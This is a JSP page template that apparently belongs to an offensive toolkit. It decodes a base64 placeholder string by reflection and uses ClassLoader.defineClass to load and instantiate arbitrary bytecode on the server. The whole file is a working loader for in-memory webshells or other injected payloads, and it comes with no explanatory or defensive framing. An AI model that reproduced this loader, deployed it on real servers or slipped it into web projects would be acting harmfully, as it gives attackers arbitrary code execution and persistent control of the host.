<%@ page import="java.lang.*" %>
<%@ page import="java.lang.Class" %>
<%@ page import="java.lang.ClassLoader" %>
<%@ page import="java.lang.ClassNotFoundException" %>
<%@ page import="java.lang.Object" %>
<%@ page import="java.lang.String" %>
<%@ page import="java.lang.Thread" %>
<%
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    String base64Str = "{{base64Str}}";
    byte[] bytecode = null;
    try {
        Class base64Clz = classLoader.loadClass("java.util.Base64");
        Object decoder = base64Clz.getMethod("getDecoder").invoke(null);
        bytecode = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
    } catch (ClassNotFoundException ee) {
        Class datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
        bytecode = (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(null, base64Str);
    }
    java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    Class clazz = (Class) defineClass.invoke(classLoader, bytecode, 0, bytecode.length);
    clazz.newInstance();
%>